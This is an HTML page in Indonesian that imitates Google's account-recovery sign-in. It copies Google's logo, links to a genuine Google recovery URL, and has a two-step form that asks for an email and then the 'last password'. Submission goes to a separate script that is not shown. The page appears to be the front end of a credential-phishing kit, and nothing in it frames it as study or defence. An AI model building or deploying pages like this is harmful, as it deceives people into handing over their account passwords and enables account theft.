<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div id="loader"><div class="bar"></div></div>

    <div class="container">
        <div class="header-static">
            <div class="logo">
                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            </div>
            
            <h1 id="mainTitle">Pemulihan akun</h1>
            <p id="subTitle">Memulihkan Akun Google Anda</p>
            
            <button class="user-pill" id="userPill" onclick="backToEmail()">
                <svg class="profile-icon" viewBox="0 0 24 24" width="20" height="20" fill="#c4c7c5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                <span id="displayEmail"></span>
                <svg class="arrow-icon" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg>
            </button>
        </div>

        <div class="slider-rail" id="rail">
            
            <div class="form-page">
                <form id="emailForm" novalidate>
                    <div class="form-group">
                        <input type="email" id="emailInput" placeholder=" " autocomplete="off">
                        <span class="label">Email atau nomor telepon</span>
                    </div>
                    
                    <div class="error-text" id="emailError">
                        <svg class="error-svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                        Masukkan email atau nomor telepon
                    </div>
                    
                    <div class="actions">
                        <a href="https://accounts.google.com/v3/signin/recoveryidentifier?ec=ar_hc_7682439&flowName=GlifWebSignIn&dsh=S-233417966%3A1774257532654576" class="btn-link">Lupa email?</a>
                        <button type="submit" class="btn-next">Berikutnya</button>
                    </div>
                </form>
            </div>

            <div class="form-page">
                <form id="passForm" novalidate>
                    <div class="form-group">
                        <input type="password" id="passwordInput" placeholder=" ">
                        <span class="label">Masukkan sandi terakhir</span>
                    </div>
                    <div class="error-text" id="passError">
                        <svg class="error-svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                        Sandi salah. Coba lagi.
                    </div>

                    <div class="checkbox-row" id="chkToggle">
                        <input type="checkbox" id="showPass">
                        <label>Tampilkan sandi</label>
                    </div>

                    <div class="actions">
                        <a href="#" class="btn-link">Lupa sandi?</a>
                        <button type="submit" class="btn-next">Berikutnya</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="footer">
        <span class="location">Indonesia 
            <svg class="footer-left-arrow" viewBox="0 0 24 24" width="16" height="16"><path d="M7 10l5 5 5-5z"/></svg>
        </span>
        <div class="footer-links">
            <a href="#">Bantuan</a>
            <a href="#">Privasi</a>
            <a href="#">Persyaratan</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
